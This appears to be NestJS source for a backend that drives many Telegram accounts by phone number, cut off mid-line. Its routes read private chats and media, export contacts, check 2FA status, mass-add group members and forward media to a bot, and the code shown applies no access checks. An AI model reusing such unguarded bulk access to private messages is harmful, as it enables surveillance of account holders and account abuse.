@Get('media/metadata/:mobile')\n    @ApiOperation({ summary: 'Get media metadata from a chat' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'chatId', required: true })\n    @ApiQuery({ name: 'types', enum: ['photo', 'video', 'document'], required: false, isArray: true })\n    @ApiQuery({ name: 'startDate', required: false })\n    @ApiQuery({ name: 'endDate', required: false })\n    @ApiQuery({ name: 'limit', description: 'Number of messages to fetch', required: false, type: Number })\n    @ApiQuery({ name: 'minId', required: false, type: Number })\n    @ApiQuery({ name: 'maxId', required: false, type: Number })\n    async getMediaMetadata(\n        @Param('mobile') mobile: string,\n        @Query('chatId') chatId: string,\n        @Query('types') types?: ('photo' | 'video' | 'document' | 'voice')[],\n        @Query('startDate') startDate?: string,\n        @Query('endDate') endDate?: string,\n        @Query('limit') limit?: number,\n        @Query('minId') minId?: number,\n        @Query('maxId') maxId?: number,\n        @Query('all') all?: boolean\n    ) {\n        return this.telegramService.getMediaMetadata(mobile, {\n            chatId,\n            types,\n            startDate: startDate ? new Date(startDate) : undefined,\n            endDate: endDate ? new Date(endDate) : undefined,\n            limit,\n            minId,\n            maxId,\n            all\n        });\n    }\n\n    @Get('media/filter/:mobile')\n    @ApiOperation({ summary: 'Get filtered media messages from a chat' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'chatId', required: true, description: 'Chat ID to get media from' })\n    @ApiQuery({ name: 'types', required: false, enum: ['photo', 'video', 'document', 'voice'], isArray: true })\n    @ApiQuery({ name: 'startDate', required: false, description: 'Filter media after this date' })\n    @ApiQuery({ name: 'endDate', required: false, description: 'Filter media before this date' })\n    @ApiQuery({ name: 'limit', required: false, type: Number, description: 'Number of media items to fetch' })\n    @ApiQuery({ name: 'minId', required: false, type: Number, description: 'Minimum message ID' })\n    @ApiQuery({ name: 'maxId', required: false, type: Number, description: 'Maximum message ID' })\n    @ApiResponse({ status: 200, type: [MediaMetadataDto] })\n    async getFilteredMedia(\n        @Param('mobile') mobile: string,\n        @Query('chatId') chatId: string,\n        @Query('types') types?: ('photo' | 'video' | 'document' | 'voice')[],\n        @Query('startDate') startDate?: string,\n        @Query('endDate') endDate?: string,\n        @Query('limit') limit?: number,\n        @Query('minId') minId?: number,\n        @Query('maxId') maxId?: number\n    ) {\n        return this.telegramService.getFilteredMedia(mobile, {\n            chatId,\n            types,\n            startDate: startDate ? new Date(startDate) : undefined,\n            endDate: endDate ? new Date(endDate) : undefined,\n            limit,\n            minId,\n            maxId\n        });\n    }\n\n    @Get('group/members/:mobile')\n    @ApiOperation({ summary: 'Get group members' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'groupId', description: 'Group ID', required: true })\n    async getGroupMembers(\n        @Param('mobile') mobile: string,\n        @Query('groupId') groupId: string\n    ) {\n        return this.telegramService.getGrpMembers(mobile, groupId);\n    }\n\n    @Post('chat/block/:mobile')\n    @ApiOperation({ summary: 'Block a chat/user' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'chatId', description: 'Chat/User ID to block', required: true })\n    async blockChat(\n        @Param('mobile') mobile: string,\n        @Query('chatId') chatId: string\n    ) {\n        return this.telegramService.blockUser(mobile, chatId);\n    }\n\n    @Delete('chat/:mobile')\n    @ApiOperation({ summary: 'Delete or clear a chat history for a user' })\n    @ApiParam({\n        name: 'mobile',\n        description: 'Mobile number of the user whose chat should be deleted',\n        required: true,\n        example: '1234567890',\n    })\n    @ApiQuery({\n        name: 'peer',\n        description: 'Username or Peer ID of the chat to delete',\n        required: true,\n        example: 'someusername',\n    })\n    @ApiQuery({ name: 'maxId', required: false, description: 'Delete messages with ID  maxId', example: 100000 })\n    @ApiQuery({ name: 'justClear', required: false, description: 'Only clear history for this user', example: false })\n    @ApiQuery({ name: 'revoke', required: false, description: 'Delete for everyone if possible', example: true })\n    @ApiQuery({ name: 'minDate', required: false, description: 'Minimum date (UNIX timestamp)', example: 1609459200 })\n    @ApiQuery({ name: 'maxDate', required: false, description: 'Maximum date (UNIX timestamp)', example: 1612137600 })\n    async deleteChatHistory(\n        @Param('mobile') mobile: string,\n        @Query() deleteHistoryDto: DeleteHistoryDto,\n    ) {\n        return this.telegramService.deleteChat(mobile, deleteHistoryDto);\n    }\n\n    // Additional Message Operations\n    @Get('messages/inline/:mobile')\n    @ApiOperation({ summary: 'Send message with inline button' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'chatId', required: true })\n    @ApiQuery({ name: 'message', required: true })\n    @ApiQuery({ name: 'url', required: true })\n    async sendMessageWithInlineButton(\n        @Param('mobile') mobile: string,\n        @Query('chatId') chatId: string,\n        @Query('message') message: string,\n        @Query('url') url: string\n    ) {\n        return this.telegramService.sendInlineMessage(mobile, chatId, message, url);\n    }\n\n    // Dialog Management\n    @Get('dialogs/:mobile')\n    @ApiOperation({ summary: 'Get all dialogs' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'limit', required: false, type: Number, description: 'Number of dialogs to fetch', default: 500 })\n    @ApiQuery({ name: 'offsetId', required: false, type: Number, description: 'Offset ID for pagination', default: 0 })\n    @ApiQuery({ name: 'archived', required: false, type: Boolean, description: 'Include archived chats', default: false })\n    async getAllDialogs(\n        @Param('mobile') mobile: string,\n        @Query('limit') limit: number = 500,\n        @Query('offsetId') offsetId: number = 0,\n        @Query('archived') archived: boolean = false\n    ) {\n        return this.telegramService.getDialogs(mobile, { limit, archived, offsetId });\n    }\n\n    @Get('last-active/:mobile')\n    @ApiOperation({ summary: 'Get last active time' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiResponse({ status: 200, description: 'Last active time retrieved successfully' })\n    async getLastActiveTime(@Param('mobile') mobile: string) {\n        return this.telegramService.getLastActiveTime(mobile);\n    }\n\n    // Enhanced Group Management\n    @Post('group/create/:mobile')\n    @ApiOperation({ summary: 'Create a new group with advanced options' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: createGroupDto })\n    async createGroupWithOptions(\n        @Param('mobile') mobile: string,\n        @Body() options: createGroupDto\n    ) {\n        return this.telegramService.createGroupWithOptions(mobile, options);\n    }\n\n    @Post('group/settings/:mobile')\n    @ApiOperation({ summary: 'Update group settings' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: GroupSettingsDto })\n    async updateGroupSettings(\n        @Param('mobile') mobile: string,\n        @Body() settings: GroupSettingsDto\n    ) {\n        return this.telegramService.updateGroupSettings(mobile, settings);\n    }\n\n    @Post('group/members/:mobile')\n    @ApiOperation({ summary: 'Add members to a group' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: GroupMemberOperationDto })\n    async addGroupMembers(\n        @Body() memberOp: GroupMemberOperationDto,\n        @Param('mobile') mobile: string,\n    ) {\n        return this.telegramService.addGroupMembers(\n            mobile,\n            memberOp.groupId,\n            memberOp.members\n        );\n    }\n\n    @Delete('group/members/:mobile')\n    @ApiOperation({ summary: 'Remove members from a group' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: GroupMemberOperationDto })\n    async removeGroupMembers(\n        @Body() memberOp: GroupMemberOperationDto,\n        @Param('mobile') mobile: string,\n    ) {\n        return this.telegramService.removeGroupMembers(\n            mobile,\n            memberOp.groupId,\n            memberOp.members\n        );\n    }\n\n    @Post('group/admin/:mobile')\n    @ApiOperation({ summary: 'Promote or demote group admins' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: AdminOperationDto })\n    async handleAdminOperation(\n        @Body() adminOp: AdminOperationDto,\n        @Param('mobile') mobile: string\n    ) {\n        if (adminOp.isPromote) {\n            return this.telegramService.promoteToAdmin(\n                mobile,\n                adminOp.groupId,\n                adminOp.userId,\n                adminOp.permissions,\n                adminOp.rank\n            );\n        } else {\n            return this.telegramService.demoteAdmin(\n                mobile,\n                adminOp.groupId,\n                adminOp.userId\n            );\n        }\n    }\n\n    @Post('chat/cleanup/:mobile')\n    @ApiOperation({ summary: 'Clean up chat history' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: ChatCleanupDto })\n    async cleanupChat(\n        @Param('mobile') mobile: string,\n        @Body() cleanup: ChatCleanupDto\n    ) {\n        return this.telegramService.cleanupChat(mobile, {\n            chatId: cleanup.chatId,\n            beforeDate: cleanup.beforeDate ? new Date(cleanup.beforeDate) : undefined,\n            onlyMedia: cleanup.onlyMedia,\n            excludePinned: cleanup.excludePinned\n        });\n    }\n\n    @Get('chat/statistics/:mobile')\n    @ApiOperation({ summary: 'Get chat statistics' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'chatId', description: 'Chat ID', required: true })\n    @ApiQuery({ name: 'period', enum: ['day', 'week', 'month'], description: 'Statistics period', required: false })\n    async getChatStatistics(\n        @Param('mobile') mobile: string,\n        @Query('chatId') chatId: string,\n        @Query('period') period: 'day' | 'week' | 'month' = 'week'\n    ): Promise<ChatStatistics> {\n        return this.telegramService.getChatStatistics(mobile, chatId, period);\n    }\n\n    // Message Scheduling\n    @Post('messages/schedule/:mobile')\n    @ApiOperation({ summary: 'Schedule a message' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: ScheduleMessageDto })\n    async scheduleMessage(\n        @Param('mobile') mobile: string,\n        @Body() schedule: ScheduleMessageDto\n    ) {\n        return this.telegramService.scheduleMessage(mobile, {\n            chatId: schedule.chatId,\n            message: schedule.message,\n            scheduledTime: new Date(schedule.scheduledTime),\n            replyTo: schedule.replyTo,\n            silent: schedule.silent\n        });\n    }\n\n    @Get('messages/scheduled/:mobile')\n    @ApiOperation({ summary: 'Get scheduled messages' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'chatId', description: 'Chat ID', required: true })\n    async getScheduledMessages(\n        @Param('mobile') mobile: string,\n        @Query('chatId') chatId: string\n    ) {\n        return this.telegramService.getScheduledMessages(mobile, chatId);\n    }\n\n    // Enhanced Media Operations\n    @Post('media/voice/:mobile')\n    @ApiOperation({ summary: 'Send voice message' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async sendVoiceMessage(\n        @Param('mobile') mobile: string,\n        @Body() voice: {\n            chatId: string;\n            url: string;\n            duration?: number;\n            caption?: string;\n        }\n    ) {\n        return this.telegramService.sendVoiceMessage(mobile, voice);\n    }\n\n    @Post('media/view-once/:mobile')\n    @ApiOperation({ summary: 'Send a view once (disappearing) media message' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiConsumes('multipart/form-data', 'application/json')\n    @ApiBody({\n        schema: {\n            type: 'object',\n            properties: {\n                chatId: { type: 'string', description: 'Chat ID to send the media to' },\n                sourceType: { type: 'string', enum: ['path', 'base64', 'binary'], description: 'Source type of media' },\n                path: { type: 'string', description: 'path of the media file (when sourceType is Path)' },\n                base64Data: { type: 'string', description: 'Base64 data (when sourceType is base64)' },\n                binaryData: { type: 'string', format: 'binary', description: 'Binary file (when sourceType is binary)' },\n                caption: { type: 'string', description: 'Optional caption for the media' },\n                filename: { type: 'string', description: 'Optional filename for the media' }\n            },\n            required: ['chatId', 'sourceType']\n        }\n    })\n    @UseInterceptors(FileInterceptor('binaryData', {\n        storage: multer.memoryStorage()\n    }))\n    @ApiResponse({ status: 200, description: 'View once media sent successfully' })\n    @ApiResponse({ status: 400, description: 'Failed to send view once media' })\n    async sendViewOnceMedia(\n        @Param('mobile') mobile: string,\n        @UploadedFile() file: Express.Multer.File,\n        @Body() viewOnceDto: ViewOnceMediaDto\n    ) {\n\n        // Handle file upload case\n        if (viewOnceDto.sourceType === MediaSourceType.BINARY && file) {\n            return this.telegramService.sendViewOnceMedia(mobile, {\n                chatId: viewOnceDto.chatId,\n                sourceType: viewOnceDto.sourceType,\n                binaryData: file.buffer,\n                caption: viewOnceDto.caption,\n                filename: viewOnceDto.filename || file.originalname\n            });\n        }\n\n        // Handle JSON payload case (URL or base64)\n        return this.telegramService.sendViewOnceMedia(mobile, {\n            chatId: viewOnceDto.chatId,\n            sourceType: viewOnceDto.sourceType,\n            path: viewOnceDto.path,\n            base64Data: viewOnceDto.base64Data,\n            caption: viewOnceDto.caption,\n            filename: viewOnceDto.filename\n        });\n    }\n\n    // Advanced Chat Operations\n    @Get('chat/history/:mobile')\n    @ApiOperation({ summary: 'Get chat history with metadata' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'chatId', required: true })\n    @ApiQuery({ name: 'offset', required: false, type: Number })\n    @ApiQuery({ name: 'limit', required: false, type: Number })\n    async getChatHistory(\n        @Param('mobile') mobile: string,\n        @Query('chatId') chatId: string,\n        @Query('offset') offset?: number,\n        @Query('limit') limit?: number\n    ) {\n        return this.telegramService.getMessagesNew(mobile, chatId, offset, limit);\n    }\n\n    @Post('group/admin/promote/:mobile')\n    @ApiOperation({ summary: 'Promote members to admin' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: AdminOperationDto })\n    async promoteToAdmin(\n        @Param('mobile') mobile: string,\n        @Body() adminOp: AdminOperationDto\n    ) {\n        return this.telegramService.promoteToAdmin(\n            mobile,\n            adminOp.groupId,\n            adminOp.userId,\n            adminOp.permissions,\n            adminOp.rank\n        );\n    }\n\n    @Post('group/admin/demote/:mobile')\n    @ApiOperation({ summary: 'Demote admin to regular member' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: GroupMemberOperationDto })\n    async demoteAdmin(\n        @Param('mobile') mobile: string,\n        @Body() memberOp: GroupMemberOperationDto\n    ) {\n        return this.telegramService.demoteAdmin(\n            mobile,\n            memberOp.groupId,\n            memberOp.members[0]\n        );\n    }\n\n    @Post('group/unblock/:mobile')\n    @ApiOperation({ summary: 'Unblock a user in a group' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async unblockGroupUser(\n        @Param('mobile') mobile: string,\n        @Body() data: {\n            groupId: string;\n            userId: string;\n        }\n    ) {\n        return this.telegramService.unblockGroupUser(mobile, data.groupId, data.userId);\n    }\n\n    @Get('group/admins/:mobile')\n    @ApiOperation({ summary: 'Get list of group admins' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'groupId', description: 'Group ID', required: true })\n    async getGroupAdmins(\n        @Param('mobile') mobile: string,\n        @Query('groupId') groupId: string\n    ) {\n        return this.telegramService.getGroupAdmins(mobile, groupId);\n    }\n\n    @Get('group/banned/:mobile')\n    @ApiOperation({ summary: 'Get list of banned users in a group' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'groupId', description: 'Group ID', required: true })\n    async getGroupBannedUsers(\n        @Param('mobile') mobile: string,\n        @Query('groupId') groupId: string\n    ) {\n        return this.telegramService.getGroupBannedUsers(mobile, groupId);\n    }\n\n    // Advanced Contact Management\n    @Post('contacts/export/:mobile')\n    @ApiOperation({ summary: 'Export contacts in vCard or CSV format' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: ContactExportImportDto })\n    async exportContacts(\n        @Param('mobile') mobile: string,\n        @Body() exportDto: ContactExportImportDto,\n        @Res() res: Response\n    ) {\n        const data = await this.telegramService.exportContacts(\n            mobile,\n            exportDto.format,\n            exportDto.includeBlocked\n        );\n\n        const filename = `contacts_${mobile}_${new Date().toISOString()}.${exportDto.format}`;\n        res.setHeader('Content-Type', exportDto.format === 'vcard' ? 'text/vcard' : 'text/csv');\n        res.setHeader('Content-Disposition', `attachment; filename=\"${filename}\"`);\n        res.send(data);\n    }\n\n    @Post('contacts/import/:mobile')\n    @ApiOperation({ summary: 'Import contacts from a list' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async importContacts(\n        @Param('mobile') mobile: string,\n        @Body() contacts: { firstName: string; lastName?: string; phone: string }[]\n    ) {\n        return this.telegramService.importContacts(mobile, contacts);\n    }\n\n    @Post('contacts/block/:mobile')\n    @ApiOperation({ summary: 'Manage blocked contacts' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: ContactBlockListDto })\n    async manageBlockList(\n        @Param('mobile') mobile: string,\n        @Body() blockList: ContactBlockListDto\n    ) {\n        return this.telegramService.manageBlockList(\n            mobile,\n            blockList.userIds,\n            blockList.block\n        );\n    }\n\n    @Get('contacts/statistics/:mobile')\n    @ApiOperation({ summary: 'Get contact activity statistics' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiResponse({ status: 200, description: 'Contact statistics retrieved successfully' })\n    async getContactStatistics(@Param('mobile') mobile: string) {\n        return this.telegramService.getContactStatistics(mobile);\n    }\n\n    // Chat Folder Management\n    @Post('folders/create/:mobile')\n    @ApiOperation({ summary: 'Create a new chat folder' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: CreateChatFolderDto })\n    async createChatFolder(\n        @Param('mobile') mobile: string,\n        @Body() folder: CreateChatFolderDto\n    ) {\n        return this.telegramService.createChatFolder(mobile, folder);\n    }\n\n    @Get('folders/:mobile')\n    @ApiOperation({ summary: 'Get all chat folders' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async getChatFolders(@Param('mobile') mobile: string) {\n        return this.telegramService.getChatFolders(mobile);\n    }\n\n    @Put('messages/:mobile')\n    @ApiOperation({ summary: 'Edit message' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async editMessage(\n        @Param('mobile') mobile: string,\n        @Body() options: {\n            chatId: string;\n            messageId: number;\n            text?: string;\n            media?: {\n                type: 'photo' | 'video' | 'document';\n                url: string;\n            };\n        }\n    ) {\n        return this.telegramService.editMessage(mobile, options);\n    }\n\n    @Post('chat/settings/:mobile')\n    @ApiOperation({ summary: 'Update chat settings' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async updateChatSettings(\n        @Param('mobile') mobile: string,\n        @Body() settings: {\n            chatId: string;\n            title?: string;\n            about?: string;\n            photo?: string;\n            slowMode?: number;\n            linkedChat?: string;\n            defaultSendAs?: string;\n            username?: string;\n        }\n    ) {\n        return this.telegramService.updateChatSettings(mobile, settings);\n    }\n\n    @Post('media/batch/:mobile')\n    @ApiOperation({ summary: 'Send multiple media files in batch' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async sendMediaBatch(\n        @Param('mobile') mobile: string,\n        @Body() options: {\n            chatId: string;\n            media: Array<{\n                type: 'photo' | 'video' | 'document';\n                url: string;\n                caption?: string;\n                fileName?: string;\n            }>;\n            silent?: boolean;\n            scheduleDate?: number;\n        }\n    ) {\n        return this.telegramService.sendMediaBatch(mobile, options);\n    }\n\n    @Get('security/2fa-status/:mobile')\n    @ApiOperation({ summary: 'Check if 2FA password is set' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async hasPassword(@Param('mobile') mobile: string) {\n        return this.telegramService.hasPassword(mobile);\n    }\n\n    @Get('chats/:mobile')\n    @ApiOperation({ summary: 'Get chats with advanced filtering' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async getChats(\n        @Param('mobile') mobile: string,\n        @Query('limit') limit?: number,\n        @Query('offsetDate') offsetDate?: number,\n        @Query('offsetId') offsetId?: number,\n        @Query('offsetPeer') offsetPeer?: string,\n        @Query('folderId') folderId?: number\n    ) {\n        return this.telegramService.getChats(mobile, {\n            limit,\n            offsetDate,\n            offsetId,\n            offsetPeer,\n            folderId\n        });\n    }\n\n    @Get('file/url/:mobile')\n    @ApiOperation({ summary: 'Get downloadable URL for a file' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async getFileUrl(\n        @Param('mobile') mobile: string,\n        @Query('url') url: string,\n        @Query('filename') filename: string\n    ): Promise<string> {\n        return this.telegramService.getFileUrl(mobile, url, filename);\n    }\n\n    @Get('messages/stats/:mobile')\n    @ApiOperation({ summary: 'Get message statistics' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async getMessageStats(\n        @Param('mobile') mobile: string,\n        @Body() options: {\n            chatId: string;\n            period: 'day' | 'week' | 'month';\n            fromDate?: Date;\n        }\n    ) {\n        return this.telegramService.getMessageStats(mobile, options);\n    }\n\n    @Get('chats/top-private/:mobile')\n    @ApiOperation({ summary: 'Get top 5 private chats with detailed statistics' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async getTopPrivateChats(@Param('mobile') mobile: string) {\n        return this.telegramService.getTopPrivateChats(mobile);\n    }\n\n    @Post('bots/add-to-channel/:mobile')\n    @ApiOperation({ summary: 'Add bots to channel with admin privileges' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({\n        schema: {\n            type: 'object',\n            properties: {\n                channelIds: {\n                    type: 'array',\n                    items: {\n                        type: 'string'\n                    },\n                    description: 'Array of channel IDs to add bots to. If not provided, will use default channels from environment variables.'\n                }\n            }\n        }\n    })\n    @ApiResponse({ status: 200, description: 'Bots added to channels successfully' })\n    async addBotsToChannel(\n        @Param('mobile') mobile: string,\n        @Body() body: { channelIds?: string[] }\n    ) {\n        return this.telegramService.addBotsToChannel(mobile, body.channelIds);\n    }\n\n    //Create bot endpoints\n    @Post('bot/create/:mobile')\n    @ApiOperation({ summary: 'Create a new bot using BotFather' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: CreateBotDto })\n    @ApiResponse({\n        status: 201,\n        description: 'Bot created successfully',\n        schema: {\n            type: 'object',\n            properties: {\n                botToken: { type: 'string', description: 'The token to access HTTP Bot API' },\n                username: { type: 'string', description: 'The username of the created bot' }\n            }\n        }\n    })\n    @ApiResponse({ status: 400, description: 'Bad Request - Invalid bot details' })\n    @ApiResponse({ status: 401, description: 'Unauthorized - Client not connected' })\n    async createBot(\n        @Param('mobile') mobile: string,\n        @Body() createBotDto: CreateBotDto\n    ) {\n        return this.telegramService.createBot(mobile, createBotDto);\n    }\n}\n","import { Module, forwardRef } from '@nestjs/common';\nimport { TelegramController } from './Telegram.controller';\nimport { TelegramService } from './Telegram.service';\nimport { UsersModule } from '../users/users.module';\nimport { BufferClientModule } from '../buffer-clients/buffer-client.module';\nimport { ActiveChannelsModule } from '../active-channels/active-channels.module';\nimport { ChannelsModule } from '../channels/channels.module';\nimport { TelegramLogger } from './utils/telegram-logger';\nimport { TelegramValidationConfig } from './config/telegram-validation.config';\n\n@Module({\n    imports: [\n        forwardRef(() => UsersModule),\n        BufferClientModule,\n        forwardRef(() => ActiveChannelsModule),\n        forwardRef(() => ChannelsModule)\n    ],\n    controllers: [TelegramController],\n    providers: [\n        TelegramService,\n        TelegramValidationConfig,\n        {\n            provide: 'TELEGRAM_LOGGER',\n            useValue: TelegramLogger.getInstance()\n        }\n    ],\n    exports: [TelegramService]\n})\nexport class TelegramModule { }\n","import { UsersService } from '../users/users.service';\nimport TelegramManager from \"./TelegramManager\";\nimport { BadRequestException, HttpException, Inject, Injectable, OnModuleDestroy, forwardRef } from '@nestjs/common';\nimport { CloudinaryService } from '../../cloudinary';\nimport { ActiveChannelsService } from '../active-channels/active-channels.service';\nimport * as path from 'path';\nimport { ChannelsService } from '../channels/channels.service';\nimport { Channel } from '../channels/schemas/channel.schema';\nimport { EntityLike } from 'telegram/define';\nimport { parseError } from '../../utils/parseError';\nimport { ChannelInfo } from './types/telegram-responses';\nimport { connectionManager } from './utils/connection-manager';\nimport { TelegramLogger } from './utils/telegram-logger';\nimport { DialogsQueryDto } from './dto/metadata-operations.dto';\nimport { ChatStatistics, ContentFilter, GroupOptions, MessageScheduleOptions } from '../../interfaces/telegram';\nimport { MediaAlbumOptions } from './types/telegram-types';\nimport * as fs from 'fs';\nimport { sleep } from 'telegram/Helpers';\nimport { fetchWithTimeout } from '../../utils/fetchWithTimeout';\nimport { SearchMessagesDto } from './dto/message-search.dto';\nimport { CreateBotDto } from './dto/create-bot.dto';\nimport { Api } from 'telegram';\nimport { shouldMatch } from '../../utils';\n\n@Injectable()\nexport class TelegramService implements OnModuleDestroy {\n    private readonly logger: TelegramLogger;\n    private cleanupInterval: NodeJS.Timer;\n\n    constructor(\n        @Inject(forwardRef(() => UsersService))\n        private usersService: UsersService,\n        @Inject(forwardRef(() => ActiveChannelsService))\n        private activeChannelsService: ActiveChannelsService,\n        @Inject(forwardRef(() => ChannelsService))\n        private channelsService: ChannelsService,\n    ) {\n        this.logger = TelegramLogger.getInstance();\n        this.cleanupInterval = connectionManager.startCleanupInterval();\n        connectionManager.setUsersService(this.usersService);\n    }\n\n    async onModuleDestroy() {\n        this.logger.logOperation('system', 'Module destroy initiated');\n        clearInterval(this.cleanupInterval as NodeJS.Timeout);\n        await connectionManager.disconnectAll();\n    }\n    public getActiveClientSetup() {\n        return TelegramManager.getActiveClientSetup();\n    }\n\n    public setActiveClientSetup(data: { days?: number, archiveOld: boolean, formalities: boolean, newMobile: string, existingMobile: string, clientId: string } | undefined) {\n        TelegramManager.setActiveClientSetup(data);\n    }\n\n    async getMessages(mobile: string, username: string, limit: number = 8) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        return telegramClient.getMessages(username, limit);\n    }\n\n\n    async getMessagesNew(mobile: string, username: string, offset: number, limit: number) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        return telegramClient.getMessagesNew(username, offset, limit);\n    }\n\n    async sendInlineMessage(mobile: string, chatId: string, message: string, url: string) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        return telegramClient.sendInlineMessage(chatId, message, url);\n    }\n\n    async getChatId(mobile: string, username: string) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        return await telegramClient.getchatId(username);\n    }\n\n    async getLastActiveTime(mobile: string) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        return await telegramClient.getLastActiveTime();\n    }\n\n    async tryJoiningChannel(mobile: string, chatEntity: Channel) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        try {\n            await telegramClient.joinChannel(chatEntity.username);\n            console.log(telegramClient.phoneNumber, \" - Joined channel Success - \", chatEntity.username);\n            if (chatEntity.canSendMsgs) {\n                // try {\n                //     await this.activeChannelsService.update(chatEntity.channelId, chatEntity);\n                //     console.log(\"updated ActiveChannels\");\n                // } catch (error) {\n                //     console.log(parseError(error));\n                //     console.log(\"Failed to update ActiveChannels\");\n                // }\n            } else {\n                await this.channelsService.remove(chatEntity.channelId);\n                await this.activeChannelsService.remove(chatEntity.channelId);\n                console.log(\"Removed Channel- \", chatEntity.username);\n            }\n        } catch (error) {\n            console.log(telegramClient.phoneNumber, \" - Failed to join - \", chatEntity.username);\n            this.removeChannels(error, chatEntity.channelId, chatEntity.username);\n            throw error\n        }\n    };\n\n    async removeChannels(error: any, channelId: string, username: string) {\n        if (error.errorMessage == \"USERNAME_INVALID\" || error.errorMessage == 'CHAT_INVALID' || error.errorMessage == 'USERS_TOO_MUCH' || error.toString().includes(\"No user has\")) {\n            try {\n                if (channelId) {\n                    await this.channelsService.remove(channelId)\n                    await this.activeChannelsService.remove(channelId);\n                    console.log(\"Removed Channel- \", channelId);\n                } else {\n                    const channelDetails = (await this.channelsService.search({ username: username }))[0];\n                    await this.channelsService.remove(channelDetails.channelId)\n                    await this.activeChannelsService.remove(channelDetails.channelId);\n                    console.log(\"Removed Channel - \", channelDetails.channelId);\n                }\n            } catch (searchError) {\n                console.log(\"Failed to search/remove channel: \", searchError);\n            }\n        } else if (error.errorMessage === \"CHANNEL_PRIVATE\") {\n            await this.channelsService.update(channelId, { private: true })\n            await this.activeChannelsService.update(channelId, { private: true });\n        }\n    }\n\n    async getGrpMembers(mobile: string, entity: EntityLike) {\n        try {\n            const telegramClient = await connectionManager.getClient(mobile);\n            return await telegramClient.getGrpMembers(entity)\n        } catch (err) {\n            console.error(\"Error fetching group members:\", err);\n        }\n    }\n\n    async addContact(mobile: string, data: { mobile: string, tgId: string }[], prefix: string) {\n        try {\n            const telegramClient = await connectionManager.getClient(mobile);\n            return await telegramClient.addContact(data, prefix)\n        } catch (err) {\n            console.error(\"Error fetching adding Contacts:\", err);\n        }\n    }\n\n\n    async addContacts(mobile: string, phoneNumbers: string[], prefix: string) {\n        try {\n            const telegramClient = await connectionManager.getClient(mobile);\n            return await telegramClient.addContacts(phoneNumbers, prefix)\n        } catch (err) {\n            console.error(\"Error fetching adding Contacts:\", err);\n        }\n    }\n\n    async getSelfMsgsInfo(mobile: string) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        return await telegramClient.getSelfMSgsInfo();\n    }\n\n    async createGroup(mobile: string) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        return await telegramClient.createGroup();\n    }\n\n    async forwardMedia(mobile: string, channel: string, fromChatId: string) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        telegramClient.forwardMedia(channel, fromChatId);\n        setTimeout(async () => {\n            try {\n                await this.leaveChannel(mobile, \"2302868706\");\n            } catch (error) {\n                console.log(\"Error in forwardMedia: \", error);\n            }\n        }, 5 * 60000);\n        return \"Media forward initiated\";\n    }\n\n    async forwardMediaToBot(mobile: string, fromChatId: string): Promise<string> {\n        try {\n            const telegramClient = await connectionManager.getClient(mobile);\n            await telegramClient.forwardMediaToBot(fromChatId);\n            const dialogs = await telegramClient.getDialogs({ limit: 500 });\n            const 